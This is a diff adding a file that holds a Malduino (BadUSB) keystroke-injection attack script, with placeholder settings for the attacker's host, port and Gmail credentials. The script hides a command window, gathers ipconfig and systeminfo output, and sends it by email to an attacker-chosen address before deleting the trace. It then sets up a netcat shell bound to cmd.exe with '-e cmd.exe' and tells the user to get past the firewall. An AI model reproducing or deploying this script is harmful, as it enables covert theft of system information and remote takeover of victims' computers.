@@ -1,0 +1,202 @@
+URL: The address of your server
+YOURHOST: Your IP, in linux terminal line type: curl ifconfig.me
+YOURPORT: Any open port of your choosing in four digits (XXXX), for example you can use 6969
+TARGETHOST: The IP of the target's computer
+YOURACCOUNTLOGIN: Your gmail account
+YOURACCOUNTPASSWORD: Your gmail password
+SENDTOACCOUNT: The email you want to send info.txt to
+
+####Attack1#### Simply a reverse shell... Control target computer on linux...
+https://www.youtube.com/watch?v=Op4s5e8gL0o
+
+----Malduino Script 1---- Target computer is the host
+REM Capture IP + system info and send via email
+DELAY 2000
+GUI r
+DELAY 200
+STRING CMD
+ENTER
+DELAY 600
+ALT SPACE
+DELAY 100
+STRING M
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+ENTER
+DELAY 400
+STRING echo "##### ipconfig/all output below #####" > %userprofile%\info.txt
+ENTER
+DELAY 600
+STRING ipconfig/all >> %userprofile%\info.txt
+ENTER
+DELAY 600
+STRING echo. >> %userprofile%\info.txt
+ENTER
+DELAY 600
+STRING echo. >> %userprofile%\info.txt
+ENTER
+DELAY 600
+STRING echo "##### systeminfo output below #####" >> %userprofile%\info.txt
+ENTER
+DELAY 600
+STRING systeminfo >> %userprofile%\info.txt
+ENTER
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 100
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+DELAY 100
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+DELAY 100
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+DELAY 100
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOURACCOUNTLOGIN', 'YOURACCOUNTPASSWORD');
+ENTER
+DELAY 100
+STRING cls
+ENTER
+DELAY 100
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 100
+STRING $ReportEmail.From = 'YOURACCOUNTLOGIN'
+ENTER
+DELAY 100
+STRING cls
+ENTER
+DELAY 100
+STRING $ReportEmail.To.Add('SENDTOACCOUNT')
+ENTER
+DELAY 100
+STRING cls
+ENTER
+DELAY 100
+STRING $ReportEmail.Subject = 'IP and system info'
+ENTER
+DELAY 100
+STRING $ReportEmail.Body = 'The info is attached!' 
+ENTER
+DELAY 100
+STRING $ReportEmail.Attachments.Add('info.txt')
+ENTER
+DELAY 100
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 600
+STRING del info.txt & exit
+ENTER
+DELAY 1000
+REM Download Netcat and initiate reverse root
+DOWNLOAD NETCAT
+enter folder/directroy with nc.exe
+nc -Lp YOURPORT -vv -e cmd.exe
+If firewall pops up, do something to pass it...
+
+----Kali Linux----
+nc TARGETHOST YOURPORT
